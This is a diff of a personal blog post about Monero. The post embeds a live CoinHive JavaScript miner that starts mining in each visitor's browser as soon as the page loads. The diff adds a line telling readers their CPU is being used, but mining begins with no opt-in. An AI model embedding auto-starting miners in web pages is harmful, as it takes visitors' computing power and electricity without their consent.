@@ -5,15 +5,13 @@ image: /img/monero.png
 tags: [monero, XMR, crypto, currency, cryptocurrency, mine, miner, mining, graphics cards, bitcoin]
 comments: true
 ---
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 Monero (XMR) is a cryptocurrency focused around privacy, decentralization and scalability.
 It was created in April of 2014 and has since seen a huge uptick in adoption.
 
 I recently discovered that there are services out there that allow you to embed a Monero Javascript miner into a web page.
-I thought this was an interesting idea and had to try it out for myself. Is it easy to do? How can it be configured? What purpose does it serve?
+I thought this was an interesting idea and had to try it out for myself. Is it easy to do? How efficient is it? How can it be utulized?
 
-## How does this work?
-
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('l0YCiLkEmA6Nk1UBDRL9O0OsHSOem86y');
 	miner.start();
@@ -47,6 +45,7 @@ I thought this was an interesting idea and had to try it out for myself. Is it e
 		xhttp.send(); 
 	}
 </script>
+**The page you are on is currently utilizing your CPU to mine Monero.**
 The current price of Monero based on data retrieved from the CryptoCompare API is <p id="XMRprice"></p>
 
 <br />
